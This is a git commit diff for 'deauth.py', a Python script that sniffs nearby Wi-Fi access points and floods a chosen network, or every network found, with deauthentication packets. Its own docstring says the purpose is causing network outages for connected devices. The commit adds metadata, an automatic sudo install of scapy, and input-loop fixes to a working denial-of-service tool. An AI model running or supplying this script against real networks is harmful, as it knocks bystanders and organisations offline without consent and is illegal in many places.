c6023f97e16be4f16d3d5534606a090cf5907005
Veerendra <veerendra2@users.noreply.github.com>
2016-12-08 21:32:08 +0530

    Update deauth.py

--- deauth.py
+++ deauth.py
@@ -1,9 +1,23 @@
 #!/usr/bin/python
+"""
+Sends deauth packets to a wifi network which results network outage for connected devices.
+"""
+__author__ ="Veerendra Kakumanu"
+__license__ = "Apache 2.0"
+__version__ = "2.0"
+__maintainer__ = "Veerendra Kakumanu"
+
 import os
-import scapy.all
 import threading
 import sys
 import re
+
+try:
+    import scapy.all
+except:
+    print "\n'scapy' module not found. Installing..."
+    os.system("sudo apt-get install python-scapy -y")
+    import scapy.all
 
 class airmon(object):
     def __new__(cls, *args,**kwargs):
@@ -16,14 +30,14 @@ class airmon(object):
         if not mon_interface:
             print "Starting monitoring interface on the wlan0..."
             if os.system("airmon-ng start wlan0")!=0:
-                print "airmon-ng not found. Please install aircrack-ng. RUN 'sudo apt-get install aircrack-ng -y'"
+                print "\nairmon-ng not found. Please install aircrack-ng. RUN 'sudo apt-get install aircrack-ng -y'"
                 raise SystemExit() #Instance creation Aborted!
             mon_interface.append("mon0")
         new_instance=object.__new__(cls,*args,**kwargs)
         setattr(new_instance, "mon_interfaces",mon_interface)
         return new_instance #returns the instance, if there is mon0 interface
 
-def spinning_cursor():
+def spinner():
     while True:
         for cursor in '|/-\\':
             yield cursor
@@ -31,15 +45,15 @@ def spinning_cursor():
 class sniffWifi(object):
     def __new__(cls,*args,**kwargs):
         mon=airmon() #Starting airmon-ng
-        return object.__new__(cls,*args,**kwargs) #returns the instance, if there is mon0 interface
+        return object.__new__(cls,*args,**kwargs) #returns the instance, IF there is mon0 interface
 
     def __init__(self,pktlimit=2000):
         self.ap_list = dict() #Key--> ssidcount, Value-->[MAC, SSID]
         self.ap_set=set()
         self.pktcount=0
         self.ssidcount=0
-        self.pktlimit=pktlimit
-        self.test=spinning_cursor()
+        self.pktlimit=pktlimit #Number of beacons should listen
+        self.test=spinner()
 
     def packetHandler(self,pkt):
         self.pktcount+=1
@@ -57,7 +71,7 @@ class sniffWifi(object):
             return False
 
     def runSniff(self): #Sniffing Here!
-        print "Sniffing wifi signals. Please wait.....",
+        print "\nSniffing wifi signals, it will take some time. Please wait.....",
         scapy.all.sniff(iface="mon0", prn = self.packetHandler, stop_filter=self.stopFilter)
 
 class Deauth(threading.Thread):
@@ -73,31 +87,37 @@ class Deauth(threading.Thread):
 
 if __name__=='__main__':
     try:
-        input=os.environ["DEAUTH"] #Starting with Environmental variable
+        input=os.environ["DEAUTH"] #Starting with Environmental variable `export DEAUTH=<MAC>`
         if re.search(r'(?:[0-9a-fA-F]:?){12}',os.environ["DEAUTH"]):
             print "Got the MAC address from environmental variable!"
             mon=airmon()
             Deauth(input).start()
         else:
-            print "Incorrect MAC address formate!"
+            print "Incorrect MAC address formate in environmental variable"
             raise ValueError
     except: # Environmental variable was not set or MAC address was not in corrent format
         if len(sys.argv)==1: # No command line argument
             ap=dict()
             sniff=sniffWifi()
             sniff.runSniff()
-            print "\n\n","0".ljust(2," "),"Send deauth packets to every network given below"
             while True:
-                for id, ssid in sniff.ap_list.iteritems():
-                    print str(id).ljust(2," "),ssid[0].ljust(20," "),ssid[1]
-                x=int(raw_input(">>"))
-                if x==0:
-                    for id,mac in sniff.ap_list.iteritems():
-                        Deauth(mac[0]).start() #Multi Threading Here
-                elif x in sniff.ap_list:
-                    Deauth(sniff.ap_list[x][0]).start()
-                else:
+                try:
+                    print "\n\n","0".ljust(2," "),"Sends deauth packets to every network which are given below"
+                    for id, ssid in sniff.ap_list.iteritems():
+                        print str(id).ljust(2," "),ssid[0].ljust(20," "),ssid[1]
+                    x=int(raw_input(">>"))
+                    if x==0:
+                        for id,mac in sniff.ap_list.iteritems():
+                            Deauth(mac[0]).start() #Multi Threading Here
+                        break
+                    elif x in sniff.ap_list:
+                        Deauth(sniff.ap_list[x][0]).start()
+                        break
+                    else:
+                        print "Please enter valid option.\n"
+                except:
                     print "Please enter valid option.\n"
+                    continue
 
         elif len(sys.argv)==2:
             input=sys.argv[1]
